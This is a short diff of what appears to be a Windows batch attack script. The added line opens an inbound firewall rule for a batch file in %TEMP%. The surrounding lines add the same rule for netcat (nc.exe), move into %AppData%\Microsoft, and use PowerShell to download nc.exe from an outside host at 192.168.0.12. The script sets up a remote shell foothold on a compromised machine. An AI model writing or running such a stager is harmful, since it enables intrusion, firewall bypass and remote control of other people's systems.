@@ -1,3 +1,4 @@
+netsh advfirewall firewall add rule name=\"security.bat\" dir=in action=allow program=\"%TEMP%\\security.bat\" enable=yes
 netsh advfirewall firewall add rule name=\"nc.exe\" dir=in action=allow program=\"%TEMP%\\nc.exe\" enable=yes
 cd %AppData%\Microsoft
 powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.12/nc.exe', 'nc.exe')
